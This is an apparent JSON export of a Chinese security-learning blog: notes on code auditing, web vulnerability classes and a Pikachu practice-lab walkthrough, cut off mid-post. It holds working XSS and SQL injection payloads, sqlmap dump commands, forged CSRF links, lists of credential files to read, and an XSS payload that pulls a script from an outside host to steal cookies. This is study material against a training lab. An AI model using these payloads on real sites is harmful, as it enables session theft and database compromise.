[{"id":"b872efa5eac542f6ec33ce5b2ff94521","title":"信息收集","content":"","slug":"信息收集","date":"2024-02-22T07:35:50.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"17847c41b99752f3acca442e5291529b","title":"代码审计","content":"概念 由具备丰富的编码经验并对安全编码及应用安全工具有很深刻理解的安全服务人员根据一定的代码规范和标准，针对应用程序源代码，从结构，脆弱性以及缺陷等方面进行审查，最终输出代码审计报告，完善应用程序，提升自身安全水平。\n\n\n\n\n\n\n\n\n\n步骤:\n\n配置审计分析环境\n熟悉业务流程\n分析程序架构\n工具自动化分析\n人工审计结果\n整理审计报告\n\n思路\n观察项目整体框架\n项目文件目录结构\n明确每个文件的作用功能\n\n\n根据敏感关键字回溯参数传递过程\n预定义的变量()$_GET $_POST $_COOKIE $_SERVER $_ENV $_SESSION等)\n未初始化的变量(regist_globle=on)\n变量覆盖\n变量的传递存储(中转的变量)\n文件包含(require，include,require_once,include_once&#96;)\n代码执行(eval() assert()等)\n命令执行(exec() shell_exec() system()等)\nSQL注入和XSS漏洞相关的关键字\nSQL注入(select from、mysql_connect、mysql_query、mysql_fetch_row、update、insert、delete SET NAMES、character_set_client=gbk、mysql_set_charset(&#39;gbk’) urldecode、rawurldecode )\nXSS(print、print_r、echo、printf、sprintf、die、var_dump、var_export等)\n\n\n查找可控变量，追踪变量传递过程\n常见的可操控变量：name、id、password、pwd、select、search\n\n\n寻找敏感功能点，通读功能点代码\n文件上传\n文件管理\n登录认证\n密码管理\n\n\n有逻辑性、有目的性地通读全文代码\n目的性: 特别关注函数集文件、配置文件、安全过滤文件、index文件等重要文件\n\n\n\n目的\n实现快速的漏洞扫描和修补\n打造更加安全可靠的网络运行环境\n\n代码审计工具RIPS\nSEAY\n","slug":"代码审计","date":"2024-02-14T08:54:53.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"d8c6760c0189ec6549efd1450ac394f5","title":"漏洞分类","content":"暴力破解漏洞\n通过系统地组合所有可能性（例如登录时用到的账户名、密码），尝试所有的可能性破解用户的账户名、密码等敏感信息，经常是使用自动化脚本组合出正确的用户名和密码。简单理解： 连续性尝试 + 字典 + 自动化\n\n流程\n确认登录接口的脆弱性\n比如:尝试登录–抓包–观察验证元素和response信息\n\n\n对字典进行优化\n根据注册提示信息进行优化\n管理员\n\n\n工具自动化操作\n\nXSS跨站脚本介绍\n跨站脚本，英文全称：Cross-Site Scripting\n\n通过输入可以被解析的特殊字符串, 如\nhtml&lt;/p&gt;&lt;script&gt;alert(&#39;this is an alart&#39;);&lt;/script&gt;&lt;p&gt;其中script标签内的代码会被执行\n\n分类: 反射型XSS, 储存型XSS, DOM型XSS\n\n反射型XSS\n\n执行流程:\n\n\n\n\n\n\n\n\n\n1、在输入点输入内容，构造恶意代码，输入点是以GET方式提交的，我们可以在URL中看到输入的内容2、后端接收提交的数据，并没有对输入进行过滤3、然后就将其呈现给了前端，浏览器执行了恶意代码\n\n\n\n存储型XSS\n\n存储型XSS和反射型XSS区别就在于，存储型XSS是将恶意构造的代码存储在了数据库\n\n执行流程:\n\n\n\n\n\n\n\n\n\n1、在留言板处输入内容，构造恶意代码2、将输入的内容，提交给后端代码执行，后端对输入过滤不严格，然后执行插入(insert)数据库操作3、此时，我们的恶意代码已经保存在了数据库，4、不管何时何地何人查看这条留言，都会被执行恶意代码，除非数据库中删除这条恶意代码\n\n\n\nDOM型XSS\n\n基于文档对象模型的漏洞，可以动态的构造DOM节点\n不经过后端代码，直接构造恶意代码，即可在前端展示\n\n\n\n\n\n测试流程\n在目标站点上找到输入点, 比如查询接口, 留言板等\n输入一组“特殊字符+唯一识别字符”，点击提交后,查看返回的源码，是否有做对应的处理\n通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);\n提交构造的脚本代码(以及各种绕过姿势)，看是否可以成功执行，如果成功执行则说明存在XSS漏洞;\n\ntips\n一般查询接口容易出现反射型XSS，留言板容易出现存储型XSS\n由于后台可能存在过滤措施,构造的script可能会被过滤掉，而无法生效,或者环境限制了执行(浏览器);\n通过变化不同的script，尝试绕过后台过滤机制;\n\nXSS绕过\n转换\n大小写&lt;ScRipT&gt;\n拼凑&lt;scr&lt;script&gt;ipt&gt;\n注释&lt;sc&lt;!--a--&gt;ript&gt;\n\n\n编码\nurl编码\nhtml编码\n\n\n\nSQL注入概述\n攻击者可以通过合法输入点提交一些精心构造的语句, 从而欺骗后台数据库对其进行执行, 导致数据库信息泄露\n\n例如:正常输入: 1, 执行select password from users where id=1非法输入:1 or 1=1, 执行select password from users where id=1 or 1=1;后者会输出表中的所有password\n\n\n攻击流程\n注入点探测(自动&#x2F;手动)\n\n判断注入点类型\n判断查询列数\n判断显示位置\n\n\n信息获取\n\n获取所有数据库名\n\n\n\n\n\n\n\n\n\n一次性显示全部:group_concat(字段名)\n逐一显示: limit\n\n获取某数据库所有表名\n\n获取某库某表中所有字段名\n\n获取字段的数据\n\n\n\n获取权限\n\n\n注入点类型\n数字型\n字符型: &#39;xxx&#39;\n搜索型: %xxx%\n\n根据类型进行构造闭合\n基于union联合查询的信息获取\n查询列数必须相同\n\n判断查询列数\norder by: 按照指定字段名进行排序\n\n基于报错信息获取\n使用一些指定的函数来制造报错, 从报错信息中获取特定的信息\n背景条件: 后台没有屏蔽报错信息, 在语法发生错误时会输出在前端\n\n报错函数\nupdatexml()\nsqlupdatexml(xml_document, XPathstring, new_value)\n#第一个参数: 表中的字段名(字符串)\n#第二个参数:Xpath格式的字符串\n#String格式，替换查找到的符合条件的**”XPath定位必须是有效的, 否则会发送错误”**可以利用这一点制造报错信\n例如updatexml(1,concat(0x7e,database(),0))会产生报错信息, 其中有database()执行的结果\n\nextractvalue()\nsqlextractvalue(xml_document, xpath_string)\n#同样通过xpath产生报错\nfloor()取整函数, 示例:\nsqlxxx&#39; and (select 2 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#\n\n盲注\n后台屏蔽了报错信息, 无法根据报错进行注入的判断  \n分类\n基于真假, 例:vince&#39; and ascii(substr(database(),1,1))=112#\n基于时间, 例:vince&#39; and if((ascii(substr(database(),1,1)))=112,sleep(5),null)#\n\n\n通过ascii(substr((xx语句), n, n))=x判断\n\n宽字节注入\n后端对输入的内容进行了转义, &#39;转义为\\&#39;使原本的payloadvince&#39; or 1=1 ;#无法使用\n由于mysql使用gbk编码, 单引号转义后编码为%5c%27, 如果在单引号前面输入%df使其变成%df%5c%27前面的%df%5c就会被解析为一个汉字, 单引号%27就成功逃逸了, 实现了闭合\npayload修改为vince%df&#39; or 1=1;#\n\nSQLmap使用文档介绍 - sqlmap 用户手册 (highlight.ink)\n\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; //带上cookie对URL进行注入探测\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; --current-db //获取数据库名\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; -D xxx --tables //获取表名\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; -D xxx -T xxx --columns //获取列名\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; -D xxx -T xxx -C xxx yyy,zzz,xxx --dump //获取指定列的信息tip:--start 1 --stop 10 (只获取前十列数据)\n\n\n文件漏洞任意文件读取与下载介绍\n当网站需要提供文件读取或文件下载功能，且对用户读取或下载的文件不做限制，则用户就能够恶意读取或下载任意敏感文件\n\n例如:\n\n\nphp// 文件读取\n&lt;?php\n    $filename = $_GET[&#39;filename&#39;];\n    if($filename)&#123;\n        echo file_get_contents($filename);\n    &#125;\n?&gt;php// 文件下载\n&lt;?php\n    $filename = $_GET[&#39;filename&#39;];\n    if(file_exists($filename))&#123;\n        $file=fopen($filename,&quot;r&quot;);\n        header(&quot;Content-Type: application/octet-stream&quot;);\n        header(&quot;Accept-Ranges: bytes&quot;);\n        header(&quot;Accept-Length: &quot;.filesize($filename));\n        header(&quot;Content-Disposition: attachment; filename=&quot; . $filename);\n        echo fread($file,filesize($filename));\n        fclose($file);\n    &#125;\n?&gt;利用\n获取常规的配置文件，如ssh,weblogic,ftp,mysql等相关配置\n获取各种日志文件，从中寻找一些后台地址，文件上传点。甚至可能寻找到别人留下的后门\n获取web业务文件进行白盒审计\n\n\n敏感信息win:\ntxtC:\\boot.ini     查看系统版本 \nC:\\Windows\\System32\\inetsrv\\MetaBase.xml    IIS配置文件 \nC:\\Windows\\repair\\sam       存储系统初次安装的密码 \nC:\\Program Files\\mysql\\my.ini       Mysql配置 \nC:\\Program Files\\mysql\\data\\mysql\\user.MYD   Mysql root \nC:\\Windows\\php.ini      php配置信息 \nC:\\Windows\\my.ini       Mysql配置信息linux:\ntxt/root/.ssh/*\n/etc/passwd \n/etc/shadow \n/etc/my.cnf     mysql配置文件\n/etc/httpd/conf/httpd.conf  apache配置文件\n/root/.bash_history     用户历史命令记录文件\n/root/.mysql_history    mysql历史命令记录文件\n/proc/self/fd/fd[0-9]*(文件标识符) \n/proc/mounts        记录系统挂载设备\n/proc/config.gz     内核配置文件\n/proc/self/cmdline  当前进程的cmdline参数\n文件包含漏洞\n当 include, include_once, require, require_once 包含一个文件时，这个文件被作为php代码执行\n\n利用条件:\n\n网站对用户公开文件包含接口\n文件包含接口未做验证或验证不严格\n\n\n例如:\nphp&lt;?php\n    $file = $_GET[&#39;file&#39;];\n    if(file_exists($file))&#123;\n        include($file);\n    &#125;else&#123;\n        include(&#39;header.php&#39;);\n    &#125;\n?&gt;\n\n任意文件删除\n当网站存在删除文件操作且其中某些关键字段用户可控时，可能导致用户恶意构造删除某些网站甚至系统文件\n\n例如:\nphp/** do delete */\nif ($action == &#39;delete&#39;) &#123;\n    $bakfile = trim($_GET[&#39;file&#39;]);\n    $filepath = $DBak-&gt;datadir.$bakfile;\n\n    if (unlink($filepath)) &#123;\n        msgbox(&#39;文件删除成功！&#39;, $fileurl.&#39;?act=restore&#39;);\n    &#125; else &#123;\n        msgbox(&#39;文件删除失败！&#39;);\n    &#125;\n&#125;\n\n文件上传漏洞利用条件\n存在文件上传操作\n未对上传文件做校验\n用户可直接或间接访问到上传的文件并可执行\n\n例如:\nphp//DVWA\n&lt;?php\nif( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123;\n    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;\n    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );\n\n    if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) &#123;\n        echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;\n    &#125;\n    else &#123;\n        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;\n    &#125;\n&#125;\n?&gt;命令执行漏洞\n可以让攻击者总直接注入命令或恶意代码, 控制服务器后台\n\n远程系统命令执行\n原理: 系统上存在给用户提供特点的远程命令操作的接口(如ping), 但是没有严格的安全控制措施\n\n例如: \nphp&lt;?php\n    if (isset($_POST[&#39;host&#39;])) &#123;\n        $host = $_POST[&#39;host&#39;];\n        $res = shell_exec(&quot;ping -c 4 &#123;$host&#125;&quot;);\n        echo $res;\n    &#125;\n?&gt;\n此时如果输入127.0.0.1; ipconfig就会把后面的命令也执行\n\n\n越权漏洞\n由于没有对用户权限进行严格的判断, 导致低权限账号可以去完成高权限账号的操作\n属于逻辑漏洞, 是由于权限校验的逻辑不够严谨\n水平越权\n同等权限级别间\n服务器后台可能没有对用户权限做严格的判断, 可能导致一个用户能够执行另一个用户的操作\n\n\n垂直越权\n不同权限级别间\n先抓取超级管理员执行增加用户的数据包, 然后退出登录, 改为登录普通管理员的账号, 将获取到的数据包的请求头中的cookie替换为普通管理员的cookie, 在请求体中填入操作信息\n\n\n\n请求伪造跨站请求伪造CSRF\n通过伪装来自受信任用户的请求来利用受信任的网站\n\n确认是否存在CSRF漏洞\n判断请求是否可以被伪造\n确认凭证的有效期\n\nToken如何防止CDRF\n每次请求增加一个随机码, 后台每次对次进行验证\n\n服务端请求伪造SSRF\n由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统\n\n数据流:攻击者—–&gt;服务器—-&gt;目标地址\n形成原因\n服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。\n例如:\nphp&lt;?php\n    function curl($url)&#123;\n        $ch = curl_init();\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_HEADER, 0);\n        curl_exec($ch);\n        curl_close($ch);\n&#125;\n$url = $_GET[&#39;url&#39;];\ncurl($url);\n?&gt;\n\n会话管理漏洞会话劫持\n获取用户Session ID后使用该Session ID进行伪装\n\n攻击步骤\n目标用户需要先登录站点\n\n登录成功后，该用户会得到站点提供的一个会话标识SessionID\n\n攻击者通过某种攻击手段捕获Session ID\n\n攻击者通过捕获到的Session ID访问站点即可获得目标用户合法会话\n#Session ID一般都设置在cookie中。\n\n\n会话固定\n诱骗受害者使用攻击者指定的会话标识\n\n原理\n访问网站时，网站会设置cookie中的session\n当用户登录后，cookie中的session保持不变\n只要获取登陆前的session内容，就可以知道登陆后的session\n\n","slug":"漏洞分类","date":"2024-02-14T08:23:14.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"a42e284740da93607374cf9810c61f9e","title":"Pikachu靶场实操","content":"暴力破解概述连续性尝试+字典+自动化\n字典\n常用的账号密码\n社工库\n算法生成\n\n暴力破解漏洞\n是否要求复杂密码\n是否使用安全的验证码\n是否进行次数限制\n是否采用双元素认证\n\n验证码\n防止登录暴力破解\n防止机器恶意注册\n\n测试流程\n确认登录接口的脆弱性\n比如:尝试登录–抓包–观察验证元素和response信息\n\n\n对字典进行优化\n根据注册提示信息进行优化\n管理员\n\n\n工具自动化操作\n\nPikachu关卡基于表单的暴力破解此关没有设置验证码等防范措施, 使用Brup Suite的Intruder功能, 如果response中没有username or password is not exists可以说明破解成功\n步骤:\n\n尝试手动提交表单, 使用brupsuite拦截\n发送到Intruder, 关闭拦截, 配置好payload和字典, 开始进行破解(Cluster bomb)\n对结果按照长度或有无username or password is not exists进行整理, 发现test&#x2F;abc123和admin&#x2F;123456可能是正确的, 验证后,可以确认破解成功\n\n验证码绕过(on server)验证码在后端会进行验证, 但是验证码可以被重复利用, 因此可以手动输入正确的验证码, 然后一直利用该验证码进行破解, 其余操作同上\n\n\n原因: php中 session默认的过期时间为1440秒, 后端没有对此进行设置, 因此这段时间内验证码可以一直用\n\n验证码绕过(on client)验证码只能在前端限制客户端发包, 非常容易解除, 没有很好的验证效果, 其余操作同上\ntoken防爆破由于token已经出现在前端代码中, 因此我们可以轻易获取, 我先猜测用户名为admin, 然后通过音叉模式结合字典和从响应中获取的token进行暴破\n\nXSS跨站脚本概述测试流程\n在目标站点上找到输入点, 比如查询接口, 留言板等\n输入一组“特殊字符+唯一识别字符”，点击提交后,查看返回的源码，是否有做对应的处理\n通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);\n提交构造的脚本代码(以及各种绕过姿势)，看是否可以成功执行，如果成功执行则说明存在XSS漏洞;\n\ntips\n一般查询接口容易出现反射型XSS，留言板容易出现存储型XSS\n由于后台可能存在过滤措施,构造的script可能会被过滤掉，而无法生效,或者环境限制了执行(浏览器);\n通过变化不同的script，尝试绕过后台过滤机制;\n\n反射型xss(GET与POST)\nGET型可以用伪装后的url, 更容易攻击\n\nXSS绕过\n转换\n大小写&lt;ScRipT&gt;\n拼凑&lt;scr&lt;script&gt;ipt&gt;\n注释&lt;sc&lt;!--a--&gt;ript&gt;\n\n\n编码\nurl编码\nhtml编码\n\n\n\nhtmlspecialchars()函数htmlspecialchars()函数把预定义的字符转换为HTML实体。\n\n\n\n\n\n\n\n\n\n&amp;(和号)成为&amp;amp“(双引号)成为&amp;quot‘(单引号)成为&amp;#039&lt;(小于)成为&amp;lt‘&gt;’(大于)成为&amp;gt\nPikachu关卡反射型xss(get)php$html.=&quot;&lt;p class=&#39;notice&#39;&gt;who is &#123;$_GET[&#39;message&#39;]&#125;,i don&#39;t care!&lt;/p&gt;&quot;;源码没有对message进行任何检查和过滤\n解除前端输入限制后输入&lt;/p&gt;&lt;script&gt;alert();&lt;/script&gt;&lt;p&gt;即可\n\n反射型xss(post)一次性,会与服务端交互,输入&lt;/p&gt;&lt;sCRiPt sRC=//uj.ci/pq7&gt;&lt;/sCrIpT&gt;&lt;p&gt;成功打到cookie\n存储型xss同样没有检查和过滤, 每次刷新都会加载一遍, 输入同上\nDOM型xss输入的内容会被填入超链接输入&#39; onclick=&#39;alert()然后点击超链接链接:\nDOM型xss-x输入内容同上, 点击第二个出现的超链接运行, 类似于get反射型xss, 可以通过url攻击\nxss之盲打我留言的内容在后台显示到管理员界面, 因此输入&lt;/td&gt;&lt;script&gt;alert();&lt;/script&gt;&lt;td&gt;, 管理员进入后台后就会被弹窗\nxss之过滤&lt;script会被过滤掉, 但是换成大写就不会, 比如&lt;ScriPt&gt;alert();&lt;/SCripT&gt;\nxss之htmlspecialchars单引号&#39;没有被处理, 因此可以输入#&#39; onclick=alert();&#39;\nxss之herf输出这关没有在后端限制只能输入url因此可以填入js代码javascript:alert()\nxss之js输出关于输入的源码如下:\nhtml&lt;script&gt;\n    $ms=&#39;432&#39;;\n    if($ms.length != 0)&#123;\n        if($ms == &#39;tmac&#39;)&#123;\n            $(&#39;#fromjs&#39;).text(&#39;tmac确实厉害,看那小眼神..&#39;)\n        &#125;else &#123;\n//            alert($ms);\n            $(&#39;#fromjs&#39;).text(&#39;无论如何不要放弃心中所爱..&#39;)\n        &#125;\n\n    &#125;\n&lt;/script&gt;可以在$ms=&#39;432&#39;构造闭合, 输入tmac&#39;&lt;/script&gt;&lt;script&gt;alert();&lt;/script&gt;\nCSRF(跨站请求伪造)概述\n通过伪装来自受信任用户的请求来利用受信任的网站\n\n与XSS的区别\nXSS可以拿到用户的权限(盗取cookie), 然后实施破坏\nCSRF借用户的权限进行攻击, 而没有拿到用户的权限\n\n确认是否存在CSRF漏洞\n判断请求是否可以被伪造\n确认凭证的有效期\n\nToken如何防止CDRF\n每次请求增加一个随机码, 后台每次对次进行验证\n\nPikachu关卡CSRF(get)\n假设攻击者是Allen, 可以得到修改信息提交表单时的url为http://192.168.1.9:7071/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=13676767767&amp;add=nba+767&amp;email=allen%40pikachu.com&amp;submit=submit\n\n假设攻击目标是vince, 已知他目前的个人信息为:\n\n\n\n\n\n\n\n\n\n姓名:vince\n性别:boy\n手机:18626545453\n住址:chain\n邮箱:&#x76;&#105;&#110;&#x63;&#x65;&#64;&#112;&#x69;&#x6b;&#x61;&#x63;&#104;&#x75;&#46;&#99;&#111;&#109;\n\n要把他的个人信息中的地址修改为moon, 那么可以伪造一个链接http://192.168.1.9:7071/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=moon&amp;email=vince%40pikachu.com&amp;submit=submit\n\n让vince点击这个链接, 就可以利用vince的权限, 向web发出请求, 修改个人信息\n\n\nCSRF(post)\npost请求中, 表单不在url中, 而在请求体中, 这时可以伪造一个站点, 让vince给伪造站点发出请求, 把请求中的参数进行修改, 向真正的站点提交post请求\n在伪造站点(钓鱼网站)中, 我在表单添加一个action, 让表单提交到真正的网站上&lt;form actiom=&quot;http://192.168.1.9:7071/vul/csrf/csrfpost/csrf_post_edit.php&quot; method=&quot;post&quot;&gt;\n在vince点击提交时, 将vince的信息进行修改, 即可达成目的\n\nCSRF TokenSQL注入概述\n攻击者可以通过合法输入点提交一些精心构造的语句, 从而欺骗后台数据库对其进行执行, 导致数据库信息泄露\n\n例如:正常输入: 1, 执行select password from users where id=1非法输入:1 or 1=1, 执行select password from users where id=1 or 1=1;后者会输出表中的所有password\n\n\n攻击流程\n注入点探测(自动&#x2F;手动)\n\n判断注入点类型\n判断查询列数\n判断显示位置\n\n\n信息获取\n\n获取所有数据库名\n\n\n\n\n\n\n\n\n\n一次性显示全部:group_concat(字段名)\n逐一显示: limit\n\n获取某数据库所有表名\n\n获取某库某表中所有字段名\n\n获取字段的数据\n\n\n\n获取权限\n\n\n注入点类型\n数字型\n字符型: &#39;xxx&#39;\n搜索型: %xxx%\n\n根据类型进行构造闭合\n基于union联合查询的信息获取\n查询列数必须相同\n\n判断查询列数\norder by: 按照指定字段名进行排序\n\n基于报错信息获取\n使用一些指定的函数来制造报错, 从报错信息中获取特定的信息\n背景条件: 后台没有屏蔽报错信息, 在语法发生错误时会输出在前端\n\n报错函数\nupdatexml()\nsqlupdatexml(xml_document, XPathstring, new_value)\n#第一个参数: 表中的字段名(字符串)\n#第二个参数:Xpath格式的字符串\n#String格式，替换查找到的符合条件的**”XPath定位必须是有效的, 否则会发送错误”**可以利用这一点制造报错信\n例如updatexml(1,concat(0x7e,database(),0))会产生报错信息, 其中有database()执行的结果\n\nextractvalue()\nsqlextractvalue(xml_document, xpath_string)\n#同样通过xpath产生报错\nfloor()取整函数, 示例:\nsqlxxx&#39; and (select 2 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#\n\n盲注\n后台屏蔽了报错信息, 无法根据报错进行注入的判断  \n分类\n基于真假, 例:vince&#39; and ascii(substr(database(),1,1))=112#\n基于时间, 例:vince&#39; and if((ascii(substr(database(),1,1)))=112,sleep(5),null)#\n\n\n通过ascii(substr((xx语句), n, n))=x判断\n\n宽字节注入Pikachu关卡数字型注入(post)\n表单内容在前端进行了限制, 但是很容易解除, 比如可以抓包然后进行修改, 下图将原本提交的1修改为1 or 1=1\n\n提交后, 可以看到所有的用户都被查询成功\n\n\n字符型注入(get)\n构造闭合即可, 先对站点进行测试, 可先传入一些特殊字符比- 如&#39;, &quot;, %等, 下面是输入单引号&#39;的结果,\n\n测试发现其后端对查询语句的处理是用单引号&#39;进行包裹的,因此可以用单引号构造闭合, 例如, 输入&#96;&#96;’ or 1&#x3D;1;#, 同样可以搜索到所有用户,  其中, #&#96;对将后面的内容注释掉防止报错\n\n\n搜索型注入\n测试发现可以用%&#39;构造闭合, 且输入#%&#39; or 1=1 order by 3;#显示正常,, 但是输入#%&#39; or 1=1 order by 4;#显示异常, 说明总共有三列\n\n输入#%&#39; and id=1 union select user(),database(),version();#获取到一些数据库信息\n\n\n\nxx型注入\n输入&#39;:\n\n通过报错信息的提示可以推断, 应按照(&#39;xx&#39;)构造闭合\n\n\n“insert&#x2F;update”注入\n*insert\n\n正常没有回显, 但是可以通过报错获取信息\n\npayload:xxx&#39; or updatexml(1,concat(0x7e,user()),0) or &#39;获取到user信息:\n\n\n\nupdate\n\npayload和insert相同\n\n\n\n“delete注入”\n分析: 根据抓包得到的信息可以发现, 执行删除操作时会向服务器发送一个get请求, 请求中含有要删除内容的数字id,推测在后端有语句delete from xxx where id=78\n\n因此可以在此次插入sql语句or updatexml(1,concat(0x7e,xxx),0) 制造报错, 从而获取信息\n\n\n“http header”注入\n根据登录后的页面可以得知, 后端对请求头的数据进行了处理, 可以尝试在请求头中插入sql语句\n\n将UA头修改为Firefox&#39; or updatexml(1, concat(0x7e, database()) ,0) or &#39;#\n得到\n\n\n盲注(base on boolean)\n后端可能对报错进行了过滤, 导致没有回显, 但是输入vince&#39; and 1=1#显示\n输入vince&#39; and 1=2#\n根据这点不同可以获取到信息,比如payload为vince&#39; and ascii(substr(database(),1,1))=112#时显示第一种情况, 说明database名的第一个字符为p, 根据这个原理可以不断的尝试直到获取到所有信息\n但是手动操作非常的麻烦, 可以使用自动化工具sqlmap进行操作获取当前数据库名:py .\\sqlmap.py -u &quot;http://192.168.5.133:7090/vul/sqli/sqli_blind_b.php?name=1234&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --current-db\n\n获取到数据库名为pikachu\n以此类推可以获取到更多信息\n\n盲注(base on time)\n没有回显, 甚至输入什么都一样, 无法通过前面的基于真假进行判断有无sql注入漏洞\n但是输入vince加载只花了80毫秒左右, 而输入vince&#39; and sleep(5)#却确实花了5秒左右\n说明sleep(5)确实作为一个sql语句被执行了, 这里存在sql注入漏洞, 结合基于真假的盲注的原理, 可以构造payload:vince&#39; and if((ascii(substr(database(),1,1)))=112,sleep(5),null)#\n同样也是5秒后才加载完成, 说明数据库名的第一个字符为p, 也可以使用sqlmap进行自动化操作\n\n宽字节注入\n后端对输入的内容进行了转义, &#39;转义为\\&#39;使原本的payloadvince&#39; or 1=1 ;#无法使用\n由于mysql使用gbk编码, 单引号转义后编码为%5c%27, 如果在单引号前面输入%df使其变成%df%5c%27前面的%df%5c就会被解析为一个汉字, 单引号%27就成功逃逸了, 实现了闭合\npayload修改为vince%df&#39; or 1=1;#\n\n越权漏洞概述\n由于没有对用户权限进行严格的判断, 导致低权限账号可以去完成高权限账号的操作\n\n属于逻辑漏洞, 是由于权限校验的逻辑不够严谨\n\n水平越权\n\n同等权限级别间\n\n\n垂直越权\n\n不同权限级别间\n\n\n\nPikachu关卡水平越权\n登录lucy账号, 然后点击”查看个人信息”的时候会发送一个get请求:http://192.168.1.9:7071/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF\n\n服务器后台可能没有对用户权限做严格的判断, 可能导致一个用户能够查看另一个用户的信息\n\n在登录lucy账号之后, 将上面get请求中的lucy改为其他用户名(比如lili), 发现可以访问\n\n\n垂直越权\n这关里pikachu是普通管理员, admin是超级管理员, 其中只有超级管理员能够执行增加用户的操作\n\n先抓取超级管理员执行增加用户的数据包, 然后退出登录, 改为登录普通管理员的账号, 将获取到的数据包的请求头中的cookie替换为pikachu的cookie, 在请求体中填入增加用户的信息\n\n\n\n","slug":"Pikachu靶场实操","date":"2024-02-04T01:57:16.000Z","categories_index":"","tags_index":"网络安全,学习日志","author_index":"Myprefer"},{"id":"38e97d07cb4887821026c06ecc181448","title":"小迪安全-P4","content":"加密识别(猜测)算法编码类型\n看密文位数\n看密文的特征(数字,  字母,  大小写,  符号等)\n看当前密文存在的地方(Web,  数据库,  操作系统等应用)\n\n获取 ( 猜测到 )加密算法后就 ( 可能 ) 可以进行解密\n加密平台md5在线解密破解\n在线DES加密解密、DES在线加密解密)\n总结30余种加密编码类型的密文特征分析（建议收藏） (qq.com)\nCTF中常见密码题解密网站总结_CTF解密网站-CSDN博客\n","slug":"小迪安全-P4","date":"2024-02-03T12:01:45.000Z","categories_index":"","tags_index":"网络安全,学习日志,小迪安全,基础入门","author_index":"Myprefer"},{"id":"b01c54bfa7b8abe9af0697abfd45eff9","title":"第四次课程-XSS与SQL注入","content":"XSS基础介绍\n跨站脚本，英文全称：Cross-Site Scripting\n\n通过输入可以被解析的特殊字符串, 如\nhtml&lt;/p&gt;&lt;script&gt;alert(&#39;this is an alart&#39;);&lt;/script&gt;&lt;p&gt;其中script标签内的代码会被执行\n\n分类: 反射型XSS, 储存型XSS, DOM型XSS\n\n反射型XSS\n\n执行流程:\n\n\n\n\n\n\n\n\n\n1、在输入点输入内容，构造恶意代码，输入点是以GET方式提交的，我们可以在URL中看到输入的内容2、后端接收提交的数据，并没有对输入进行过滤3、然后就将其呈现给了前端，浏览器执行了恶意代码\n\n\n\n存储型XSS\n\n存储型XSS和反射型XSS区别就在于，存储型XSS是将恶意构造的代码存储在了数据库\n\n执行流程:\n\n\n\n\n\n\n\n\n\n1、在留言板处输入内容，构造恶意代码2、将输入的内容，提交给后端代码执行，后端对输入过滤不严格，然后执行插入(insert)数据库操作3、此时，我们的恶意代码已经保存在了数据库，4、不管何时何地何人查看这条留言，都会被执行恶意代码，除非数据库中删除这条恶意代码\n\n\n\nDOM型XSS\n\n基于文档对象模型的漏洞，可以动态的构造DOM节点\n不经过后端代码，直接构造恶意代码，即可在前端展示\n\n\n\n\n练习:alert(1) (haozi.me)\n\n\n\nSQL注入概述\n攻击者可以通过合法输入点提交一些精心构造的语句, 从而欺骗后台数据库对其进行执行, 导致数据库信息泄露\n\n例如:正常输入: 1, 执行select password from users where id=1非法输入:1 or 1=1, 执行select password from users where id=1 or 1=1;后者会输出表中的所有password\n\n\n攻击流程\n注入点探测(自动&#x2F;手动)\n\n判断注入点类型\n判断查询列数\n判断显示位置\n\n\n信息获取\n\n获取所有数据库名\n\n\n\n\n\n\n\n\n\n一次性显示全部:group_concat(字段名)\n逐一显示: limit\n\n获取某数据库所有表名\n\n获取某库某表中所有字段名\n\n获取字段的数据\n\n\n\n获取权限\n\n\n注入点类型\n数字型\n字符型: &#39;xxx&#39;\n搜索型: %xxx%\n\n根据类型进行构造闭合\n基于union联合查询的信息获取\n查询列数必须相同\n\n判断查询列数\norder by: 按照指定字段名进行排序\n\n基于报错信息获取\n使用一些指定的函数来制造报错, 从报错信息中获取特定的信息\n背景条件: 后台没有屏蔽报错信息, 在语法发生错误时会输出在前端\n\n报错函数\nupdatexml()\nsqlupdatexml(xml_document, XPathstring, new_value)\n#第一个参数: 表中的字段名(字符串)\n#第二个参数:Xpath格式的字符串\n#String格式，替换查找到的符合条件的**”XPath定位必须是有效的, 否则会发送错误”**可以利用这一点制造报错信\n例如updatexml(1,concat(0x7e,database(),0))会产生报错信息, 其中有database()执行的结果\n\nextractvalue()\nsqlextractvalue(xml_document, xpath_string)\n#同样通过xpath产生报错\nfloor()取整函数, 示例:\nsqlxxx&#39; and (select 2 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#\n\n盲注\n后台屏蔽了报错信息, 